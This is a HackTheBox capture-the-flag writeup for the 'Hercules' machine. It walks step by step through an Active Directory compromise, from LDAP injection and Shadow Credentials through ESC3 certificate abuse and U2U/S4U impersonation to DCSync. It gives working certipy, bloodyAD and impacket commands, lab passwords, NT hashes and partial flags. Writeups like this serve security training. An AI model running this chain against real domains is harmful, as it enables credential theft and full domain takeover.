# Hercules (HTB) — Full AD Chain Writeup

> SEO: HackTheBox Hercules writeup, HackTheBox Hercules walkthrough, HTB Hercules solution, hercules.htb Active Directory exploit chain.

> **Target IP used in this run:** `<TARGET_IP>`  
> **Domain:** `hercules.htb`  
> **DC Hostname:** `dc.hercules.htb`

---

## 1) Scope & Summary

Hercules is a deep Windows AD chain:

1. LDAP injection on web login to recover reused creds
2. Shadow Credentials pivot to privileged identities
3. AD OU/object control abuse
4. ESC3 enrollment-agent abuse (critical: use DCOM)
5. Service-account chain + U2U/S4U trick
6. DCSync and final Administrator access

This writeup reflects a **working run** against `<TARGET_IP>`, including timing constraints from the periodic reset/cleanup behavior.

---

## 2) Initial setup

```bash
echo "<TARGET_IP> dc.hercules.htb hercules.htb" | sudo tee -a /etc/hosts
```

Recommended Kerberos config for this target:

```ini
# /etc/krb5.conf
[libdefaults]
    default_realm = HERCULES.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true

[realms]
    HERCULES.HTB = {
        kdc = dc.hercules.htb
        admin_server = dc.hercules.htb
    }

[domain_realm]
    .hercules.htb = HERCULES.HTB
    hercules.htb = HERCULES.HTB
```

---

## 3) Web/LDAP phase

- LDAP filter injection in login flow was used to enumerate users and extract sensitive `description` data.
- Recovered reused password pattern:

`change*th1s_p@ssw()rd!!`

- Valid account reused in chain:

`ken.w : change*th1s_p@ssw()rd!!`

---

## 4) Credential pivot to `natalie.a`

Via the web-admin/document workflow chain (cookie + Bad-ODF + NetNTLMv2 capture/crack path), we used:

`natalie.a : Prettyprincess123!`

Then:

```bash
getTGT.py 'HERCULES.HTB/natalie.a:Prettyprincess123!' -dc-ip <TARGET_IP>
```

---

## 5) Shadow Credentials to `bob.w`

```bash
export KRB5CCNAME=$(pwd)/natalie.a.ccache
certipy shadow auto -k -no-pass -u natalie.a@hercules.htb \
  -dc-ip <TARGET_IP> -target dc.hercules.htb -dc-host dc.hercules.htb \
  -account bob.w
```

Result included `bob.w.ccache` and NT hash:

`bob.w : 8a65c74e8f0073babbfac6725c66cc3f`

---

## 6) Object move + Shadow to `auditor`

Move object as required by ACL model:

```bash
# move Auditor -> Web Department
ldapmodify -Y GSSAPI -H ldap://dc.hercules.htb -f move_auditor.ldif
```

Then shadow `auditor` from `natalie.a`:

```bash
export KRB5CCNAME=$(pwd)/natalie.a.ccache
certipy shadow auto -k -no-pass -u natalie.a@hercules.htb \
  -dc-ip <TARGET_IP> -target dc.hercules.htb -dc-host dc.hercules.htb \
  -account auditor
```

Resulting NT hash:

`auditor : a9285c625af80519ad784729655ff325`

---

## 7) User flag

Kerberos WinRM as `auditor`:

```bash
export KRB5CCNAME=$(pwd)/auditor.ccache
python3 winrmexec.py -ssl -port 5986 -k -no-pass \
  -X "type C:\\Users\\auditor\\Desktop\\user.txt" \
  hercules.htb/auditor@dc.hercules.htb
```

**user.txt:**

`30a01498710660e5████████████████`

---

## 8) Forest Migration control + `fernando.r`

Grant control repeatedly (reset task may revert):

```bash
export KRB5CCNAME=$(pwd)/auditor.ccache
bloodyAD --host dc.hercules.htb -d hercules.htb -k -i <TARGET_IP> \
  add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor
```

Enable/reset `fernando.r` (must be quick around resets):

```bash
python3 winrmexec.py -ssl -port 5986 -k -no-pass \
  -X "powershell -c \"Enable-ADAccount -Identity fernando.r; Set-ADAccountPassword -Identity fernando.r -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Reset\"" \
  hercules.htb/auditor@dc.hercules.htb
```

---

## 9) ESC3 (critical fix: use DCOM)

### 9.1 Enrollment Agent cert

```bash
getTGT.py 'HERCULES.HTB/fernando.r:NewPass123!' -dc-ip <TARGET_IP>
export KRB5CCNAME=$(pwd)/fernando.r.ccache

certipy req -u FERNANDO.R@hercules.htb -k -no-pass \
  -target dc.hercules.htb -target-ip <TARGET_IP> \
  -dc-host dc.hercules.htb -dc-ip <TARGET_IP> \
  -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dcom -out fernando_ea2
```

### 9.2 On-behalf cert for `ashley.b` (DCOM)

```bash
certipy req -u FERNANDO.R@hercules.htb -k -no-pass \
  -target dc.hercules.htb -target-ip <TARGET_IP> \
  -dc-host dc.hercules.htb -dc-ip <TARGET_IP> \
  -ca 'CA-HERCULES' -template 'UserSignature' \
  -on-behalf-of 'hercules\ASHLEY.B' -pfx fernando_ea2.pfx -dcom
```

This produced `ashley.b.pfx` successfully (the major blocker in many runs if using RPC instead of DCOM).

### 9.3 Authenticate as `ashley.b`

```bash
rm -f ashley.b.ccache
certipy auth -pfx ashley.b.pfx -dc-ip <TARGET_IP> -no-hash
```

---

## 10) IIS_Administrator timing window (reset-aware)

This target has periodic cleanup/reset behavior. Reliable path:

1. Run `aCleanup.ps1` as `ashley.b`
2. Wait ~22–25s
3. Re-apply GenericAll on Forest Migration (`IT SUPPORT` and `Auditor`)
4. Rapidly attempt:
   - remove `ACCOUNTDISABLE` from `IIS_Administrator`
   - reset `IIS_Administrator` password

Once the window hit:

- `IIS_Administrator` became enabled
- password set to `Passw0rd@123`

Then:

```bash
getTGT.py 'HERCULES.HTB/IIS_Administrator:Passw0rd@123' -dc-ip <TARGET_IP>
```

---

## 11) IIS_Webserver$ chain + U2U/S4U trick

Reset service-account password from `IIS_Administrator` context:

```bash
export KRB5CCNAME=$(pwd)/IIS_Administrator.ccache
bloodyAD --host dc.hercules.htb -d hercules.htb -k -i <TARGET_IP> \
  set password 'IIS_Webserver$' 'Passw0rd@123'
```

Get TGT with RC4 hash-based auth:

```bash
# NT hash of Passw0rd@123
# 14d0fcda7ad363097760391f302da68d
getTGT.py 'HERCULES.HTB/IIS_Webserver$' -hashes ':14d0fcda7ad363097760391f302da68d' -dc-ip <TARGET_IP>
```

Extract TGT session key from `IIS_Webserver$.ccache` (type 23 expected), then set account NT hash to that session key:

```bash
export KRB5CCNAME=$(pwd)/IIS_Webserver$.ccache
changepasswd.py -newhashes ':<SESSION_KEY_HEX>' \
  'hercules.htb/IIS_Webserver$@dc.hercules.htb' \
  -hashes ':14d0fcda7ad363097760391f302da68d' -dc-ip <TARGET_IP> -k
```

Now request impersonation ticket:

```bash
export KRB5CCNAME=$(pwd)/IIS_Webserver$.ccache
getST.py -spn 'cifs/dc.hercules.htb' -impersonate Administrator \
  -dc-ip <TARGET_IP> 'hercules.htb/IIS_Webserver$' -k -no-pass -u2u
```

Output:

`Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache`

---

## 12) DCSync + Administrator ticket

```bash
export KRB5CCNAME=$(pwd)/Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
secretsdump.py -k -no-pass dc.hercules.htb -dc-ip <TARGET_IP> -just-dc-user administrator
```

Recovered Administrator NT hash:

`56855ee6b7570edefde6ac262200756e`

Then:

```bash
getTGT.py 'HERCULES.HTB/Administrator' -hashes ':56855ee6b7570edefde6ac262200756e' -dc-ip <TARGET_IP>
```

---

## 13) Root flag

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache
python3 winrmexec.py -ssl -port 5986 -k -no-pass \
  -X "cmd /c type C:\\Users\\Admin\\Desktop\\root.txt" \
  hercules.htb/administrator@dc.hercules.htb
```

**root.txt:**

`4bb7856e2706b719████████████████`

---

## Notes / Lessons

- On this host, **ESC3 via Certipy should use `-dcom`** when RPC retrieval paths are unstable.
- Cleanup/reset timing is decisive; scripting the race loop is far more reliable than manual clicks.
- For the IIS service-account stage, the **session-key == NT-hash** alignment is mandatory for successful U2U+S4U chaining in this setup.

---

## Final Flags (this run)

- `user.txt`: `30a01498710660e5████████████████`
- `root.txt`: `4bb7856e2706b719████████████████`
